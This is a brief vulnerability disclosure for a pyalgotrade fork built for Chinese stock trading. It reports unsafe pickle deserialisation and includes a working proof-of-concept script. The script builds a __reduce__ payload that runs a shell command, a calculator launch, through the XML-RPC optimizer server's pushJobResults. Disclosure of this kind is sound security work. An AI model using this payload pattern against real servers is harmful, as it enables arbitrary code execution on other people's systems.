# Description
pyalgotrade tailored for Chinese stock market  
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install pyalgotrade')
from pyalgotrade.optimizer import xmlrpcserver
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
xmlrpcserver.Server.pushJobResults(dumps,dumps,dumps,dumps,dumps)
```
* `pip3 install pyalgotrade`
* `python3 exploit.py`
